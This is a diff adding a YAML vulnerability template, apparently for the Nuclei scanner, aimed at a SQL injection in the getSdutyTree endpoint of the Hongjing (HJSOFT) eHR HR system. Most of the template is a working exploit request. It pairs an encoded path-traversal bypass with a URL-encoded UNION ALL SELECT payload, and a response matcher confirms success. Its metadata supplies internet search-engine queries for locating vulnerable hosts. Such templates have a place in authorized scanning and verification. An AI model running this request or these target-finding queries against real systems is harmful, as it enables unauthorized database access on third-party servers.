@@ -1,0 +1,33 @@
+id: HJSOFT-HCM_getSdutyTree_SQLi
+
+info:
+  name: HJSOFT-HCM_getSdutyTree_SQLi
+  author: HK
+  severity: high
+  description: 宏景eHR人力资源管理系统(ERP) getSdutyTree接口codeitemid参数存在SQL注入漏洞。
+  metadata:
+    max-request: 1
+    Fofa-query: body="/ThirdResource/respond/respond.min.js"
+    Quaker-query: body="/ThirdResource/respond/respond.min.js"
+    Hunter-query: body="/ThirdResource/respond/respond.min.js"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=%31%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%31%32%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Connection: close
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - qxjp
